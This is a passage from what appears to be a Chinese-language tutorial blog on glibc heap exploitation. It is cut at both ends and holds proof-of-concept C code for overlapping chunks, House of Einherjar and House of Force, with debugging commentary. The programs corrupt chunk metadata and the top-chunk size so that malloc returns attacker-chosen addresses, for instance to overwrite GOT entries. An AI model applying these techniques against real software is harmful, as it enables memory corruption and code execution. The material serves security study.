prev_in_use + <span class="built_in">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">  real_size_p6 = <span class="built_in">malloc_usable_size</span>(p6);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p6 from %p to %p&quot;</span>, p6,  (<span class="type">unsigned</span> <span class="type">char</span> *)p6+real_size_p6);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nchunk p3 from %p to %p\n&quot;</span>, p3, (<span class="type">unsigned</span> <span class="type">char</span> *) p3+real_size_p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s\n&quot;</span>,(<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s write something inside p6\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(p6,<span class="string">&#x27;F&#x27;</span>,<span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nData inside chunk p3: \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s\n&quot;</span>,(<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-9"><a href="#调试-9" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_AY7EM3HWZB8HJSE.png"
                      alt="图片描述"
                ><br>首先申请5个<code>0x3e8</code>堆块，<code>p1</code>,<code>p2</code>,<code>p3</code>,<code>p4</code>,<code>p5</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_K6GZGM7MWCZGCTS.png"
                      alt="图片描述"
                ><br><code>free(4)</code>后，假设<code>p1</code>存在<code>off-by-one</code>漏洞，将<code>p2</code>的<code>size</code>改为<code>0x3f0+0x3f0+0x1=0x7e1</code>大小。再次<code>free(p2)</code>将会把<code>p3</code>覆盖掉，并且会与<code>chunk_p4</code>重合，此时我们再次申请0x7d8大小的堆块即可获得chunk_p3的控制权。</p>
<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h2><h3 id="源码-10"><a href="#源码-10" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Credit to st4g3r for publishing this technique</span></span><br><span class="line"><span class="comment">   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</span></span><br><span class="line"><span class="comment">   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* a;</span><br><span class="line">	<span class="type">uint8_t</span>* b;</span><br><span class="line">	<span class="type">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);</span><br><span class="line">	a = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> real_a_size = <span class="built_in">malloc_usable_size</span>(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create a fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">	fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">	fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">	fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">	fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">	fake_chunk[<span class="number">4</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">	fake_chunk[<span class="number">5</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">	 * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">	<span class="type">int</span> real_b_size = <span class="built_in">malloc_usable_size</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;b&#x27;.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line">	<span class="comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">		   <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span></span><br><span class="line">		   <span class="string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Write a fake prev_size to the end of a</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span></span><br><span class="line">		   <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">	<span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((b-<span class="built_in">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>) - (<span class="type">uint8_t</span>*)fake_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="built_in">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">	*(<span class="type">size_t</span>*)&amp;a[real_a_size-<span class="built_in">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);</span><br><span class="line">	fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// free b and it will consolidate with our fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//if we allocate another chunk before we free b we will need to </span></span><br><span class="line">	<span class="comment">//do two things: </span></span><br><span class="line">	<span class="comment">//1) We will need to adjust the size of our fake chunk so that</span></span><br><span class="line">	<span class="comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span></span><br><span class="line">	<span class="comment">//2) we will need to write the size of our fake chunk</span></span><br><span class="line">	<span class="comment">//at the location we control. </span></span><br><span class="line">	<span class="comment">//After doing these two things, when unlink gets called, our fake chunk will</span></span><br><span class="line">	<span class="comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span></span><br><span class="line">	<span class="comment">//otherwise we need to make sure that our fake chunk is up against the</span></span><br><span class="line">	<span class="comment">//wilderness</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-10"><a href="#调试-10" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F3ZFDGEK2RFX33H.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F4BT7673NJYMD9K.png"
                      alt="图片描述"
                ><br>申请<code>a=0x41</code>，<code>b=0x101</code>两个堆块，并在栈上构建一个<code>fake_chunk</code>，并且<code>fake_chunk_fd_bk = fake_chunk_prev_size</code>，用来绕过<code>unlink</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_8ZKFC6YP36TCPUC.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_69JHW2FXP62QRD8.png"
                      alt="图片描述"
                ><br>然后利用<code>off-by-null</code>漏洞将堆块<code>b</code>的<code>PREV_INUSE</code>位改为<code>0</code>，计算出堆块<code>b</code>与<code>fake_chunk</code>的距离(<code>fake_size</code>)，这里是个负数。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_G7UVK2Z39Q7V4N2.png"
                      alt="图片描述"
                ><br>然后将<code>fake_chunk_size</code>改为<code>fake_size</code>，然后将堆块<code>b</code>的<code>prev_size</code>改为改为<code>fake_size</code>，绕过检查<code>prev_size == size</code>的检查。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2UT6ZP9UTJP74U9.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4DKB7Y89T8FSWD8.png"
                      alt="图片描述"
                ><br>我们<code>free(b)</code>后，会进行如上检查。向后合并会把负数<code>fake_size</code>转为整数，然后会先开始后合并，又<code>chunk_b</code>紧邻<code>top_chunk</code>，会再与其进行合并。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7ZCUWQ3KAVGKAB7.png"
                      alt="图片描述"
                ><br>此时我们再申请堆块将从<code>fake_chunk_prev_size</code>开始分配。</p>
<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-11"><a href="#源码-11" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This PoC works also with ASLR enabled.</span></span><br><span class="line"><span class="comment">   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</span></span><br><span class="line"><span class="comment">   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum </span></span><br><span class="line"><span class="comment">   ( http://phrack.org/issues/66/10.html )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss_var[] = <span class="string">&quot;This is a string that we want to overwrite.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span></span><br><span class="line">		<span class="string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Its current value is: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> real_size = <span class="built_in">malloc_usable_size</span>(p1);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="built_in">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line">	<span class="type">intptr_t</span> *ptr_top = (<span class="type">intptr_t</span> *) ((<span class="type">char</span> *)p1 + real_size - <span class="built_in">sizeof</span>(<span class="type">long</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="built_in">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">	*(<span class="type">intptr_t</span> *)((<span class="type">char</span> *)ptr_top + <span class="built_in">sizeof</span>(<span class="type">long</span>)) = <span class="number">-1</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="built_in">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">	<span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span></span><br><span class="line">	   <span class="string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span></span><br><span class="line">	   <span class="string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment">	 * new_top = old_top + nb</span></span><br><span class="line"><span class="comment">	 * nb = new_top - old_top</span></span><br><span class="line"><span class="comment">	 * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment">	 * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment">	 * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> evil_size = (<span class="type">unsigned</span> <span 